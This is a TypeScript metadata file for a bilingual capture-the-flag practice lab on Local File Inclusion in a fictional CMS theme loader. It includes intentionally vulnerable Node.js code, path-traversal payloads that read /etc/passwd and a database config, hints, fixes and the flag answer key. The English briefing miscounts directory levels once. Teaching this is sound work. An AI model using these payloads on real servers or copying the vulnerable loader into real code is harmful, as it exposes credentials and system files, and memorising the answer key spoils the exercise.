// src/modules/practice-labs/file-inclusion/labs/lab1/lab1.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lfiLab1Metadata: LabMetadata = {
  slug: 'lfi-basic-path-traversal-cms-theme',
  title: 'File Inclusion: Basic LFI — CMS Theme Loader Path Traversal',
  ar_title: 'تضمين الملفات: أساسي — اجتياز المسار في محمّل قوالب CMS',
  description:
    'Exploit a Local File Inclusion vulnerability in a CMS theme loader where the template parameter is passed directly to a file read function without sanitization. Use path traversal (../../) to escape the templates directory and read sensitive system files.',
  ar_description:
    'استغل ثغرة LFI في محمّل قوالب CMS حيث يُمرَّر معامل القالب مباشرة لدالة قراءة الملف بدون تعقيم. استخدم اجتياز المسار (../../) للخروج من مجلد القوالب وقراءة ملفات النظام الحساسة.',
  difficulty: 'BEGINNER',
  category: 'WEB_SECURITY',
  skills: [
    'Local File Inclusion',
    'Path Traversal',
    'Directory Traversal',
    'File Read',
    'Input Validation Bypass',
  ],
  xpReward: 120,
  pointsReward: 60,
  duration: 25,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'The CMS loads templates via ?template=default. Traverse the path using ../../ sequences to read /etc/passwd, then read /var/www/cms/config/database.php to find the flag hidden in the DB credentials.',
  ar_goal:
    'يحمّل CMS القوالب عبر ?template=default. اجتَز المسار باستخدام تسلسلات ../../ لقراءة /etc/passwd، ثم اقرأ /var/www/cms/config/database.php لإيجاد العلم المخفي في بيانات قاعدة البيانات.',

  briefing: {
    en: `PageCraft CMS. Professional content management.
You're browsing the site. You notice the URL.
/page?template=default
template=default.
The server reads a file.
/var/www/cms/templates/default
What if you change "default"?
template=about → loads about template.
template=contact → loads contact template.
The server just appends your input to a path and reads it.
No validation. No sanitization.
In a filesystem, "../" means "go up one directory."
/var/www/cms/templates/ has 3 levels after root: var, www, cms, templates.
So: ../../../../etc/passwd
That's 4 levels up from templates/ → reaches root → /etc/passwd.
The server reads it. Returns it.
You're reading arbitrary files on the server.
/etc/passwd. /etc/shadow. Application configs.
The DB config file is at /var/www/cms/config/database.php.
From /var/www/cms/templates/:
../../config/database.php
Two levels up to /var/www/cms/, then into config/.
The flag is inside.`,
    ar: `PageCraft CMS. إدارة محتوى احترافية.
أنت تتصفح الموقع. تلاحظ الـ URL.
/page?template=default
template=default.
الخادم يقرأ ملفاً.
/var/www/cms/templates/default
ماذا لو غيّرت "default"؟
template=about → يحمّل قالب about.
template=contact → يحمّل قالب contact.
الخادم فقط يُلحق مدخلاتك بمسار ويقرأه.
بدون تحقق. بدون تعقيم.
في نظام الملفات، "../" تعني "ارتفع مجلداً واحداً."
/var/www/cms/templates/ لديها 4 مستويات بعد الجذر: var، www، cms، templates.
لذا: ../../../../etc/passwd
4 مستويات للأعلى من templates/ → تصل للجذر → /etc/passwd.
الخادم يقرأه. يُعيده.
أنت تقرأ ملفات عشوائية على الخادم.
/etc/passwd. /etc/shadow. إعدادات التطبيق.
ملف إعداد DB في /var/www/cms/config/database.php.
من /var/www/cms/templates/:
../../config/database.php
مستويان للأعلى إلى /var/www/cms/، ثم إلى config/.
العلم بداخله.`,
  },

  stepsOverview: {
    en: [
      'GET /page?template=default — confirm normal template loading, observe response structure',
      'Probe path traversal: template=../../../etc/passwd — count directory levels from /var/www/cms/templates/',
      'Confirm LFI: template=../../../../etc/passwd → /etc/passwd contents returned (4 levels up from templates/)',
      'Enumerate: template=../../../../etc/hosts → reveals internal network topology',
      'Read DB config: template=../../config/database.php → flag found in $db_pass comment',
    ],
    ar: [
      'GET /page?template=default — أكّد تحميل القالب العادي، لاحظ هيكل الاستجابة',
      'اختبر اجتياز المسار: template=../../../etc/passwd — احسب مستويات المجلدات من /var/www/cms/templates/',
      'أكّد LFI: template=../../../../etc/passwd → محتويات /etc/passwd مُعادة (4 مستويات للأعلى من templates/)',
      'استعرض: template=../../../../etc/hosts → يكشف طوبولوجيا الشبكة الداخلية',
      'اقرأ إعداد DB: template=../../config/database.php → العلم موجود في تعليق $db_pass',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'PageCraft /page endpoint reads fs.readFileSync("/var/www/cms/templates/" + template). No path normalization, no jail check, no allowlist. The directory structure is /var/www/cms/templates/ — 4 levels from filesystem root. Path traversal with ../../../../ escapes to root. The DB config at ../../config/database.php (relative to templates/) contains the flag.',
    vulnerableCode:
      "// Template loader (vulnerable):\napp.get('/page', isAuthenticated, async (req, res) => {\n" +
      '  const { template } = req.query;\n' +
      '  // ❌ Direct path concatenation — no validation!\n' +
      '  const content = fs.readFileSync(\n' +
      "    '/var/www/cms/templates/' + template, 'utf8'\n" +
      '  );\n' +
      '  res.send(content);\n' +
      '});',
    exploitation:
      'GET /page?template=../../../../etc/passwd → /etc/passwd contents\n' +
      'GET /page?template=../../config/database.php → DB config with flag',
    steps: {
      en: [
        'GET /page?template=../../../../etc/passwd → "root:x:0:0:root:/root:/bin/bash\\ndaemon:..."',
        'GET /page?template=../../../../etc/hosts → internal network IPs revealed',
        'GET /page?template=../../config/database.php → "// FLAG: FLAG{LFI_BASIC_PATH_TRAVERSAL_CMS_TEMPLATE_DB_CONFIG}"',
      ],
      ar: [
        'GET /page?template=../../../../etc/passwd → "root:x:0:0:root:/root:/bin/bash\\ndaemon:..."',
        'GET /page?template=../../../../etc/hosts → عناوين IP الداخلية مكشوفة',
        'GET /page?template=../../config/database.php → "// FLAG: FLAG{LFI_BASIC_PATH_TRAVERSAL_CMS_TEMPLATE_DB_CONFIG}"',
      ],
    },
    fix: [
      'Use an allowlist: only accept known template names — ["default","about","contact"] — reject anything else',
      'Path canonicalization: use path.resolve() then verify it starts with the allowed base directory',
      'Separate template names from filesystem paths: store templates by ID in DB, never use user input as filename',
      'Jailing: const resolved = path.resolve(BASE, template); if (!resolved.startsWith(BASE)) throw new Error("Path traversal")',
    ],
  },

  postSolve: {
    explanation: {
      en: 'Path traversal (LFI) is one of the simplest yet most impactful vulnerabilities. When user input is concatenated to a file path without normalization, the "../" sequence exploits how operating systems resolve paths: every filesystem treats ".." as "go up one directory." The server\'s intent was to serve files from /templates/ — but there is no enforcement. Any file readable by the web server process is accessible: /etc/passwd, /etc/shadow, application configs, source code, .env files, and private keys.',
      ar: 'اجتياز المسار (LFI) هو واحد من أبسط الثغرات وأكثرها تأثيراً. عندما يُلحق مدخل المستخدم بمسار ملف بدون تطبيع، يستغل تسلسل "../" كيفية حل أنظمة التشغيل للمسارات: كل نظام ملفات يعامل ".." كـ "ارتفع مجلداً واحداً." نية الخادم كانت خدمة الملفات من /templates/ — لكن لا يوجد تطبيق. أي ملف قابل للقراءة بواسطة عملية خادم الويب متاح: /etc/passwd، /etc/shadow، إعدادات التطبيق، الكود المصدري، ملفات .env، والمفاتيح الخاصة.',
    },
    impact: {
      en: 'The database.php config file reveals production DB credentials (host, user, password, database). Combined with the /etc/hosts internal network map, an attacker can directly connect to the production database bypassing network controls. The /etc/passwd reveals all system user accounts and their home directories for further enumeration.',
      ar: 'يكشف ملف database.php الإعداد عن بيانات اعتماد DB الإنتاجية (host، user، password، database). مع خريطة الشبكة الداخلية /etc/hosts، يستطيع المهاجم الاتصال مباشرة بقاعدة البيانات الإنتاجية متجاوزاً ضوابط الشبكة. يكشف /etc/passwd جميع حسابات مستخدمي النظام ومجلداتهم الرئيسية لمزيد من الاستعراض.',
    },
    fix: [
      'Allowlist approach: define const ALLOWED = ["default","about","contact"]; if (!ALLOWED.includes(template)) return 403',
      'path.resolve() jail: const safe = path.resolve(BASE_DIR, template); assert(safe.startsWith(BASE_DIR + path.sep))',
      'Never use user input as filesystem path: assign each template an ID, fetch path from DB by ID',
      'Read-only filesystem mount: mount the templates directory as read-only with no access to parent directories',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 10,
      content:
        'Try /page?template=default — works normally. What if you use "../" to go up one directory? In a file path, "../" means "go up one level." The server base path is /var/www/cms/templates/.',
    },
    {
      order: 2,
      xpCost: 20,
      content:
        'Path traversal: /var/www/cms/templates/ + ../../../../etc/passwd = /etc/passwd. Count: 1=cms, 2=www, 3=var, 4=root. So 4 levels of "../" gets you to root.',
    },
    {
      order: 3,
      xpCost: 35,
      content:
        'GET /page?template=../../../../etc/passwd — you should see the Linux user database. Confirms LFI. Now find the database config file.',
    },
    {
      order: 4,
      xpCost: 50,
      content:
        "The DB config is at /var/www/cms/config/database.php. From templates/ that's ../../config/database.php (2 levels up to /var/www/cms/, then into config/).",
    },
  ],

  flagAnswer: 'FLAG{LFI_BASIC_PATH_TRAVERSAL_CMS_TEMPLATE_DB_CONFIG}',
  initialState: {
    contents: [
      {
        title: 'TEMPLATE_DEFAULT',
        body: '<html><body><h1>Welcome to PageCraft CMS</h1><p>Default template loaded.</p></body></html>',
        author: 'template_file',
        isPublic: true,
      },
      {
        title: 'TEMPLATE_ABOUT',
        body: '<html><body><h1>About Us</h1><p>PageCraft — Professional CMS Solution</p></body></html>',
        author: 'template_file',
        isPublic: true,
      },
      {
        title: 'ETC_PASSWD',
        body: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\ncms_user:x:1001:1001:PageCraft CMS:/home/cms_user:/bin/bash',
        author: 'system_file',
        isPublic: false,
      },
      {
        title: 'DB_CONFIG',
        body: '<?php\n// PageCraft Database Configuration\n$db_host = "db-prod-01.internal";\n$db_user = "pagecraft_admin";\n$db_pass = "PgCr4ft_Pr0d_2024!";\n$db_name = "pagecraft_production";\n// FLAG: FLAG{LFI_BASIC_PATH_TRAVERSAL_CMS_TEMPLATE_DB_CONFIG}\n?>',
        author: 'config_file',
        isPublic: false,
      },
      {
        title: 'ETC_HOSTS',
        body: '127.0.0.1 localhost\n127.0.1.1 pagecraft-prod-01\n172.31.0.1 db-prod-01.internal\n172.31.0.2 redis-prod-01.internal\n172.31.0.3 mail-prod-01.internal',
        author: 'system_file',
        isPublic: false,
      },
    ],
  },
};
